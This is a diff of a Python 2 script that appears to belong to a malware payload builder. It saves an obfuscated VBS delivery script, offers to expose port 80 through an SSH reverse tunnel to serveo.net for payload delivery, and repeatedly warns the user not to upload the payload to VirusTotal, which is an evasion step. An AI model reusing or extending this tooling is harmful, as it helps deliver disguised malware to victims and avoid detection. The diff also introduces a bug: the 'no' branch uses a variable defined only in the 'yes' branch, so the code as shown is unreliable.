@@ -167,16 +167,18 @@ class build():
 		clear()
 		yes = {'yes','y','ye',''}
 		no = {'no','n','exit'}
+
 		input = raw_input('Delivery script obfuscated and saved as "obfs.vbs"\n\nWould you like to start a serveo server to forward port 80 for payload delivery? yes/no: ').lower()
 
 		if input in yes:
-			domain = raw_input('\nenter subdomain name for serveo server: ')
-			print("\n\nDon't upload to virus total!!!"* 15)
+			domain = raw_input('\nEnter subdomain name for serveo server: ')
+			x = "\n\nDon't upload to virus total!!!"
+			print(x*15)
 			time.sleep(2)
 			os.system('ssh -o ServerAliveInterval=60 -R'+domain+'.serveo.net:80:localhost:80 serveo.net')
 
 		elif input in no:
-			print("\n\nDon't upload to virus total!!!"* 15)
+			print(x*15)
 			time.sleep(2)
 			sys.exit()
 		else:
